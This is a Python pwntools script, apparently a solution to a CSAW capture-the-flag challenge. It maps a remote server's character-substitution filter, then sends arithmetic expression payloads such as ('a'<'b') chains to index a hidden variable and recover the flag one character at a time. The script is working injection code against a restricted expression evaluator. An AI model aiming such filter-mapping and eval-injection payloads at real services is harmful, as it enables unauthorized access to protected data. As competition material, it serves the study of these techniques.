from pwn import *
import math

HOST = "chals.ctf.csaw.io"
PORT = 21009

OPTIMIZED_PAYLOADS = {}

def build_optimized_payloads(max_n):
    log.info(f"Pre-calculating shortest payloads for numbers up to {max_n}...")
    
    # Base cases
    one_payload = "('a'<'b')"
    OPTIMIZED_PAYLOADS[0] = "('a'>'b')"
    OPTIMIZED_PAYLOADS[1] = one_payload

    for i in range(2, max_n + 1):
        # Lựa chọn 1: Tạo bằng phép cộng (i-1) + 1
        payload_add = f"({OPTIMIZED_PAYLOADS[i-1]}+{one_payload})"
        min_len = len(payload_add)
        best_payload = payload_add

        # Lựa chọn 2: Thử tất cả các khả năng nhân j * k = i
        for j in range(2, int(math.sqrt(i)) + 1):
            if i % j == 0:
                k = i // j
                payload_mult = f"({OPTIMIZED_PAYLOADS[j]}*{OPTIMIZED_PAYLOADS[k]})"
                if len(payload_mult) < min_len:
                    min_len = len(payload_mult)
                    best_payload = payload_mult
        
        OPTIMIZED_PAYLOADS[i] = best_payload
    log.success("Payload calculation complete.")

def get_neg_index_payload(n):
    """Lấy payload đã được tính toán trước để có chỉ số âm -n."""
    if n == 1:
        return "~('a'>'b')" # ~0 = -1
    if n > 1:
        # Để có -n, chúng ta cần tính ~(n-1)
        number_payload = OPTIMIZED_PAYLOADS[n-1]
        return f"~({number_payload})"
    return None

def solve():
    build_optimized_payloads(100)
    
    p = remote(HOST, PORT)
    possible_chars = 'abcdefghijklmnopqrstuvwxyz\''
    
    log.info("Step 1: Finding WARPED_QUOTE...")
    WARPED_QUOTE = None
    for char in possible_chars:
        payload = char + 'a' + char
        p.recvuntil(b'> ')
        p.sendline(payload.encode())
        response = p.recvline().strip().decode()
        if 'no galaxy' not in response: WARPED_QUOTE = char; break
    log.success(f"Found WARPED_QUOTE: '{WARPED_QUOTE}'")

    log.info("Step 2: Building reverse map...")
    reverse_map = {WARPED_QUOTE: "'"}
    chars_to_discover = [c for c in possible_chars if c != WARPED_QUOTE]
    for char in chars_to_discover:
        payload = WARPED_QUOTE + char + WARPED_QUOTE
        p.recvuntil(b'> ')
        p.sendline(payload.encode())
        reverse_map[char] = p.recvline().strip().decode()
    log.success(f"Built reverse map with {len(reverse_map)} entries.")

    log.info("Step 3: Building warp map...")
    warp_map = {v: k for k, v in reverse_map.items()}
    log.success("Warp map created.")

    log.info("Step 4: Retrieving flag with FULLY OPTIMIZED payloads...")
    flag_chars = []
    for i in range(1, 101):
        index_payload = get_neg_index_payload(i)
        original_payload = f"spiral[{index_payload}]"
        
        if len(original_payload) > 150:
            log.warning(f"Original payload for index {-i} is too long ({len(original_payload)} chars)! Stopping.")
            break

        warped_payload = "".join([warp_map.get(c, c) for c in original_payload])

        p.recvuntil(b'> ')
        p.sendline(warped_payload.encode())
        response = p.recvline().strip().decode()

        if 'no galaxy' in response:
            log.info("End of flag reached.")
            break
        
        flag_chars.append(response)
        # log.info(f"Got char: {response}")

    flag = "".join(reversed(flag_chars))
    log.success(f"FLAG: {flag}")

    p.close()

if __name__ == "__main__":
    solve()